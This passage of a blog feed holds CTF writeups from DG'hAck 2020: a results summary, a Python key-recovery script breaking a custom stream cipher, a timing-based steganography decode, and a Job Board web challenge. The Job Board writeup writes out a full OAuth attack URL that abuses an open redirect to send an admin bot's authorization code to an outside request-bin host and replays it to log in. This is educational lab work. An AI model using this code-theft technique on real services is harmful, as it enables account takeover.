&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof1">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>DG'hAck: My Second CTF</title><link>https://nicolasb.fr/blog/dghack-my-second-ctf/</link><pubDate>Tue, 01 Dec 2020 14:37:19 +0100</pubDate><guid>https://nicolasb.fr/blog/dghack-my-second-ctf/</guid><description>I joined this CTF because there was a possiblity to get an internship (or a job). I think I did pretty well, ranking 1/1214 among the students, and 5 overall out of 2063 :)
This was a whole lot of fun, I got to learn a ton of things, lose some sleep, and make new friends. I can&amp;rsquo;t wait for my next CTF!
Here are the challenges that I completed, with links to my writeups:</description><content>&lt;p>I joined this CTF because there was a possiblity to get an internship (or a job). I think I did pretty well, ranking 1/1214 among the students, and 5 overall out of 2063 :)&lt;/p>
&lt;p>This was a whole lot of fun, I got to learn a ton of things, lose some sleep, and make new friends. I can&amp;rsquo;t wait for my next CTF!&lt;/p>
&lt;p>Here are the challenges that I completed, with links to my writeups:&lt;/p>
&lt;ul>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-internal-support-1/">Internal support 1&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-internal-support-2/">Internal support 2&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-up-credit/">UpCredit&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-server-room/">Server room&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-walters-blog/">Walter&amp;rsquo;s Blog&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/">Involucrypt1&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-gitbad/">GitBad&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-shadowmallet/">ShadowMallet&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> Dharma.exe&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-sad-crypto/">Sad Crypto&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-bwing/">Bwing&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-stickitup/">StickItUp&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/">Time for something different&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> Strange thing&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> FlightControl&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-job-board/">JobBoard&lt;/a>&lt;/li>
&lt;li>&lt;input checked="" disabled="" type="checkbox"> &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/">Involucrypt2&lt;/a>&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> file_reader&lt;/li>
&lt;li>&lt;input disabled="" type="checkbox"> MyBDD&lt;/li>
&lt;/ul>
&lt;p>I still need to get better at binary exploitation / reverse engineering!&lt;/p>
&lt;h2 id="screenshots">Screenshots&lt;/h2>
&lt;p>The results (&lt;a href="https://www.defense.gouv.fr/dga/actualite/cybersecurite-resultats-du-challenge-dg-hack">source&lt;/a>):
&lt;a href="https://nicolasb.fr/assets/dghack/resultats.jpg">&lt;img src="https://nicolasb.fr/assets/dghack/resultats.jpg" alt="The scoreboard for everyone">&lt;/a>&lt;/p>
&lt;p>The general scoreboard:
&lt;a href="https://nicolasb.fr/assets/dghack/scoreboard-general.png">&lt;img src="https://nicolasb.fr/assets/dghack/scoreboard-general.png" alt="The scoreboard for everyone">&lt;/a>&lt;/p>
&lt;p>The student scoreboard:
&lt;a href="https://nicolasb.fr/assets/dghack/scoreboard-student.png">&lt;img src="https://nicolasb.fr/assets/dghack/scoreboard-student.png" alt="The dashboard">&lt;/a>&lt;/p>
&lt;p>And my dashboard:
&lt;a href="https://nicolasb.fr/assets/dghack/challenges.jpg">&lt;img src="https://nicolasb.fr/assets/dghack/challenges.jpg" alt="The dashboard">&lt;/a>&lt;/p></content></item><item><title>Writeup DG'hAck: Involucrypt 2</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</link><pubDate>Tue, 01 Dec 2020 04:11:32 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</guid><description>This is the second version of the involucrypt challenge. You can see my writeup of the first version here. It presents the encryption script and a simple bruteforce approach.
The only thing that changed for the second version is the encrypted data, which is now 1497 bytes long. This makes the previous bruteforce attempt unusable: checking a single key takes about 50ms on my machine, and there are a lot of possible keys (since it&amp;rsquo;s 10 chars instead of 3).</description><content>&lt;p>This is the second version of the involucrypt challenge. You can see my writeup of the first version &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/">here&lt;/a>. It presents the encryption script and a simple bruteforce approach.&lt;/p>
&lt;p>The only thing that changed for the second version is the encrypted data, which is now &lt;code>1497&lt;/code> bytes long. This makes the previous bruteforce attempt unusable: checking a single key takes about 50ms on my machine, and there are a lot of possible keys (since it&amp;rsquo;s 10 chars instead of 3).&lt;/p>
&lt;p>After looking at the code, the only weird thing I found was the &lt;code>base&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">keystream&lt;/span>(seeds, length, base&lt;span style="color:#f92672">=&lt;/span>None):
key &lt;span style="color:#f92672">=&lt;/span> base &lt;span style="color:#66d9ef">if&lt;/span> base &lt;span style="color:#66d9ef">else&lt;/span> []
&lt;span style="color:#66d9ef">for&lt;/span> seed &lt;span style="color:#f92672">in&lt;/span> seeds:
random &lt;span style="color:#f92672">=&lt;/span> mersenne_rng(seed)
&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(BLOCK):
&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
&lt;span style="color:#66d9ef">break&lt;/span>
key&lt;span style="color:#f92672">.&lt;/span>append(random&lt;span style="color:#f92672">.&lt;/span>get_rand_int(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">255&lt;/span>))
random&lt;span style="color:#f92672">.&lt;/span>shuffle(key)
&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> key
&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s not used anywhere! It allows the keystream function to &amp;ldquo;resume&amp;rdquo; itself: to add blocks at the end of an already generated keystream.&lt;/p>
&lt;p>At first glance, it might seem like it would be a great way to speedup the bruteforce. And it is! But there are still way too many possibilities (&lt;code>26^10&lt;/code> or &lt;code>141167095653376&lt;/code>, if we assume the key is still made up of lowercase letters).&lt;/p>
&lt;p>The thing that you had to notice was the way the blocks are shuffled. Let&amp;rsquo;s look at an example.&lt;/p>
&lt;p>We&amp;rsquo;ll take a message that&amp;rsquo;s 6 bytes long, and a block size of 2.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> list(map(ord, &lt;span style="color:#e6db74">&amp;#39;key&amp;#39;&lt;/span>))
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> BLOCK &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># First, let&amp;#39;s try to encode the whole message:&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">6&lt;/span>)
[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># Then, let&amp;#39;s generate the blocks on after another:&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">2&lt;/span>)
[&lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">4&lt;/span>)
[&lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key, &lt;span style="color:#ae81ff">6&lt;/span>)
[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
&lt;span style="color:#75715e"># Now let&amp;#39;s use the base param to do the same thing, but starting from the&lt;/span>
&lt;span style="color:#75715e"># last block (using zeros as padding).&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>:], &lt;span style="color:#ae81ff">6&lt;/span>, base&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> BLOCK &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>)
[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>:], &lt;span style="color:#ae81ff">6&lt;/span>, base&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> BLOCK &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> keystream(key[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>:], &lt;span style="color:#ae81ff">6&lt;/span>, base&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> BLOCK &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
[&lt;span style="color:#ae81ff">167&lt;/span>, &lt;span style="color:#ae81ff">23&lt;/span>, &lt;span style="color:#ae81ff">61&lt;/span>, &lt;span style="color:#ae81ff">97&lt;/span>, &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">201&lt;/span>]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Noticed something? When starting from the last block, the integers are in the right place. This allows us to try and decrypt the bytes, and then by simply checking if the characters are valid or not determine the last letter of the key. We can then repeat this process for the penultimate block, and up until we reach the first one.&lt;/p>
&lt;p>We can use this simple trick to reduce the space we need to search from &lt;code>26^10&lt;/code> to &lt;code>26*10&lt;/code>. This is way better! Let&amp;rsquo;s write a script:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> sys
&lt;span style="color:#f92672">import&lt;/span> math
&lt;span style="color:#f92672">import&lt;/span> string
&lt;span style="color:#f92672">import&lt;/span> operator
&lt;span style="color:#f92672">import&lt;/span> itertools
&lt;span style="color:#75715e"># Note: I renamed the script `crypt.py` to `ccrypt.py`, to avoid naming issues.&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> ccrypt &lt;span style="color:#f92672">import&lt;/span> keystream, BLOCK
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(string, key, base):
key &lt;span style="color:#f92672">=&lt;/span> keystream(map(ord, key), len(string), base)
stream &lt;span style="color:#f92672">=&lt;/span> itertools&lt;span style="color:#f92672">.&lt;/span>starmap(operator&lt;span style="color:#f92672">.&lt;/span>xor, zip(key, string))
&lt;span style="color:#66d9ef">return&lt;/span> list(stream)
data &lt;span style="color:#f92672">=&lt;/span> open(sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
block_count &lt;span style="color:#f92672">=&lt;/span> math&lt;span style="color:#f92672">.&lt;/span>ceil(len(data) &lt;span style="color:#f92672">/&lt;/span> BLOCK)
password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Key: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> block_count, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">for&lt;/span> block &lt;span style="color:#f92672">in&lt;/span> range(block_count &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
guesses &lt;span style="color:#f92672">=&lt;/span> []
&lt;span style="color:#66d9ef">for&lt;/span> guess &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase:
key &lt;span style="color:#f92672">=&lt;/span> guess &lt;span style="color:#f92672">+&lt;/span> password
decrypted &lt;span style="color:#f92672">=&lt;/span> encrypt(data, key, bytearray(bytes(BLOCK &lt;span style="color:#f92672">*&lt;/span> block)))
valid_count &lt;span style="color:#f92672">=&lt;/span> sum(&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> c &lt;span style="color:#f92672">in&lt;/span> decrypted &lt;span style="color:#66d9ef">if&lt;/span> chr(c) &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable)
guesses&lt;span style="color:#f92672">.&lt;/span>append((key, decrypted, valid_count))
password, _, _ &lt;span style="color:#f92672">=&lt;/span> max(guesses, key&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">lambda&lt;/span> x: x[&lt;span style="color:#ae81ff">2&lt;/span>])
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Key: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> block &lt;span style="color:#f92672">+&lt;/span> password, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Content:&amp;#34;&lt;/span>)
decoded &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(
chr(a &lt;span style="color:#f92672">^&lt;/span> b) &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(data, keystream(map(ord, password), len(data)))
)
&lt;span style="color:#66d9ef">print&lt;/span>(decoded)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And run it:&lt;/p>
&lt;pre>&lt;code>$ pypy3 brute3.py involucrypt2
Key: ajjfisptoi
Content:
It's something about ya girl,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
that just makes my head wanna twirl,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
oh you got me want to tell all them other girls,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
there's nothing else better in this world!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
the moment i seen her i was in shock
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
so shocked you would've think I've just been shot,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
shot down right now in this spot.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
But too bad this doesn't happen a lot.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Oh girl you got me visualizing me on top,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
on top of your hot body while were sweating a lot,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
a lot of time on the clock before we have to stop.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
too bad shes not into that stuff a lot,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
oh man shes really super hot,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hotter than the sun that's right on top,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Oh man there she goes i had to stop,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
and ask her some questions that i had in stock.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
She said she want's to take it slow,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
i'm not that type of guy ill let cha know,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
when i see that red light all i know is go,
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
so baby girl lets do this on the floor.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
show me your moves that makes you such a pro
*the flag is supahotfire*
&lt;/code>&lt;/pre>&lt;p>This took 10 seconds on my machine (thanks to &lt;a href="https://www.pypy.org/">pypy3&lt;/a>), which is really short. The key is &lt;code>ajjfisptoi&lt;/code>, and the flag is &lt;code>supahotfire&lt;/code>.&lt;/p>
&lt;p>Note: running the new script on &lt;code>involucrypt1&lt;/code> successfully decrypts it in about half a second, which is a nice speedup.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Job Board</title><link>https://nicolasb.fr/blog/writeup-dghack-job-board/</link><pubDate>Mon, 30 Nov 2020 17:45:33 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-job-board/</guid><description>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:
Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.</description><content>&lt;p>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/job-board-landing.png">&lt;img src="https://nicolasb.fr/assets/dghack/job-board-landing.png" alt="The dashboard">&lt;/a>&lt;/p>
&lt;p>Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.&lt;/p>
&lt;p>Clicking the login button prompts us for a username and password; the &lt;code>test/test&lt;/code> combination works. We&amp;rsquo;re greeted with a list of jobs:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/job-board-positions.png">&lt;img src="https://nicolasb.fr/assets/dghack/job-board-positions.png" alt="The available jobs">&lt;/a>&lt;/p>
&lt;p>Now the authentication system looks like OAuth, which is quite complicated. Let&amp;rsquo;s look at the URLs called when logging in:&lt;/p>
&lt;ul>
&lt;li>POST &lt;code>http://jobboard2.chall.malicecyber.com/oauth/authorize&lt;/code>, with the params:
&lt;pre>&lt;code>client_id=svvhKlyEA7qODbl16JTUPQNz
response_type=code
redirect_uri=http://jobboard2.chall.malicecyber.com/connect/auth/callback
scope=profile
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>GET &lt;code>http://jobboard2.chall.malicecyber.com/connect/auth/callback&lt;/code>, with the single param &lt;code>code=FOOdZjenThSgRBOBmbP2jB2TOzxb79xNNbFyi24h3I1DPuD5&lt;/code>&lt;/li>
&lt;li>GET &lt;code>http://jobboard2.chall.malicecyber.com/login&lt;/code>, with the params:
&lt;pre>&lt;code>access_token=BlhXQy0AbcoocRXTmWUTpXCyNFKLnrYgZoF2eIW9Id
raw[access_token]=BlhXQy0AbcoocRXTmWUTpXCyNFKLnrYgZoF2eIW9Id
raw[expires_in]=864000
raw[scope]=profile
raw[token_type]=Bearer
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>The first URL (the login form) redirects to the second, and the second to the third.&lt;/p>
&lt;p>If we assume that the bot will sign in when presented with the login form, the &lt;code>redirect_uri&lt;/code> parameter gets really interesting. We could just change it to a URI on our server, and get a code allowing us to login with the account that the bot uses.&lt;/p>
&lt;p>Replacing the URI with a custom one yields the following error:&lt;/p>
&lt;pre>&lt;code>invalid_request: Invalid &amp;quot;redirect_uri&amp;quot; in request.
&lt;/code>&lt;/pre>&lt;p>However, we seem to be able to change the path, eg:&lt;/p>
&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/REDIRECT
&lt;/code>&lt;/pre>&lt;p>So if we find an open redirect on the server, we can get the code. Looking more closely at the list of jobs, we find that clicking on one redirects to:&lt;/p>
&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/safelink/http%3A%2F%2Fexample.com%2F
&lt;/code>&lt;/pre>&lt;p>After creating a &lt;a href="https://requestbin.com/">request bin&lt;/a>, we can replace the example domain:&lt;/p>
&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/safelink/https%3A%2F%2Fen43o9xcx03qo.x.pipedream.net
&lt;/code>&lt;/pre>&lt;p>Opening that link seems to work! We have everything we need now, let&amp;rsquo;s craft our malicious URL:&lt;/p>
&lt;pre>&lt;code>http://jobboard2.chall.malicecyber.com/oauth/authorize?client_id=svvhKlyEA7qODbl16JTUPQNz&amp;amp;response_type=code&amp;amp;redirect_uri=http%3A%2F%2Fjobboard2.chall.malicecyber.com%2Fsafelink%2Fhttps%253A%252F%252Fen43o9xcx03qo.x.pipedream.net&amp;amp;scope=profile
&lt;/code>&lt;/pre>&lt;p>And send it to the bot. After a few seconds, we see:&lt;/p>
&lt;pre>&lt;code>/?code=qAV9LcN3T2vb8Fjycx6pqGZBIPyLs0nCqphbLqohi9929iq5
&lt;/code>&lt;/pre>&lt;p>Great! Now we just have to open &lt;code>https://jobboard2.chall.malicecyber.com/connect/auth/callback?code=qAV9LcN3T2vb8Fjycx6pqGZBIPyLs0nCqphbLqohi9929iq5&lt;/code> in our browser, and we&amp;rsquo;re logged in!&lt;/p>
&lt;p>We see:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/job-board-flag.png">&lt;img src="https://nicolasb.fr/assets/dghack/job-board-flag.png" alt="The secret job">&lt;/a>&lt;/p>
&lt;p>The flag is &lt;code>DontRollYourOwn&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Time for Something Different</title><link>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</link><pubDate>Mon, 30 Nov 2020 17:03:31 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</guid><description>This is a steganography challenge where we&amp;rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.
Nothing seems to be unique, except the time of each packet, that we can extract using tshark:
$ tshark -r data.pcap -T fields -e frame.time_epoch 1604485685.271523000 1604485685.974534000 1604485686.737381000 1604485687.390550000 1604485688.103364000 1604485689.336651000 1604485690.500205000 1604485690.982931000 1604485691.465408000 1604485692.617796000 1604485693.701056000 1604485694.814156000 1604485695.686772000 1604485696.799993000 1604485697.943153000 1604485699.106441000 1604485699.589015000 1604485700.071611000 1604485700.754520000 1604485701.266580000 1604485702.449633000 1604485702.942506000 1604485704.054744000 1604485705.</description><content>&lt;p>This is a steganography challenge where we&amp;rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.&lt;/p>
&lt;p>Nothing seems to be unique, except the time of each packet, that we can extract using &lt;code>tshark&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ tshark -r data.pcap -T fields -e frame.time_epoch
1604485685.271523000
1604485685.974534000
1604485686.737381000
1604485687.390550000
1604485688.103364000
1604485689.336651000
1604485690.500205000
1604485690.982931000
1604485691.465408000
1604485692.617796000
1604485693.701056000
1604485694.814156000
1604485695.686772000
1604485696.799993000
1604485697.943153000
1604485699.106441000
1604485699.589015000
1604485700.071611000
1604485700.754520000
1604485701.266580000
1604485702.449633000
1604485702.942506000
1604485704.054744000
1604485705.228047000
1604485705.589787000
1604485706.843252000
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip; there isn&amp;rsquo;t anything that stands out. We could also look at the time delta in between each packet:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ tshark -r data.pcap -T fields -e frame.time_delta
0.000000000
0.703011000
0.762847000
0.653169000
0.712814000
1.233287000
1.163554000
0.482726000
0.482477000
1.152388000
1.083260000
1.113100000
0.872616000
1.113221000
1.143160000
1.163288000
0.482574000
0.482596000
0.682909000
0.512060000
1.183053000
0.492873000
1.112238000
1.173303000
0.361740000
1.253465000
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Hmm.. The first bit looks like binary, but decoding it gives nothing useful. Looking at the second and third lines, the deltas start with &lt;code>70&lt;/code> and &lt;code>76&lt;/code>, which are the ASCII codes for &lt;code>F&lt;/code> and &lt;code>L&lt;/code>.&lt;/p>
&lt;p>This is it, the first three chars without the dot represent ASCII codes, let&amp;rsquo;s decode them:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ tshark -r data.pcap -T fields -e frame.time_delta | python -c &lt;span style="color:#e6db74">&amp;#39;import sys; print(&amp;#34;&amp;#34;.join(map(lambda d: chr(int(d.replace(&amp;#34;.&amp;#34;, &amp;#34;&amp;#34;)[:3])), sys.stdin)))&amp;#39;&lt;/span>
FLAG&lt;span style="color:#f92672">{&lt;/span>t00sloWort00D3v1ou$&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>t00sloWort00D3v1ou$&lt;/code>.&lt;/p>
&lt;hr>
